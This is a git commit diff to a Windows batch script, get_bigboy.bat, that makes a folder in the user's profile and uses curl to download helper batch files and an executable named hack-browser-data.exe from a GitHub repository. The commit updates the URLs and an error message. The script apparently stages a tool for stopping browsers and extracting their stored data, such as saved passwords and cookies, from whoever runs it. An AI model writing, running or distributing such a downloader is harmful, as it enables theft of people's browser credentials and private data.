ac857a126d2842205af3ed6f15c0532d8db723e1
24-20 <106987713+24-20@users.noreply.github.com>
2024-12-10 19:37:57 +0100

    Update get_bigboy.bat

--- get_bigboy.bat
+++ get_bigboy.bat
@@ -4,10 +4,10 @@ mkdir "%USERPROFILE%\BIGBOY" 2>nul
 cd "%USERPROFILE%\BIGBOY"
 
 echo Downloading files from GitHub...
-curl -L -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
-curl -L -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
-curl -L -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
-curl -L -o yourexe.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe
+curl -L -o process.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/process.bat
+curl -L -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/stop_browsers.bat
+curl -L -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/start_browsers.bat
+curl -L -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/refs/heads/main/bigboyfolder/hack-browser-data.exe
 
 echo Verifying downloads...
 if not exist "process.bat" (
@@ -23,7 +23,7 @@ if not exist "start_browsers.bat" (
     exit /b 1
 )
 if not exist "hack-browser-data.exe" (
-    echo Error: Failed to download yourexe.exe
+    echo Error: Failed to download hack-browser-data.exe
     exit /b 1
 )
 
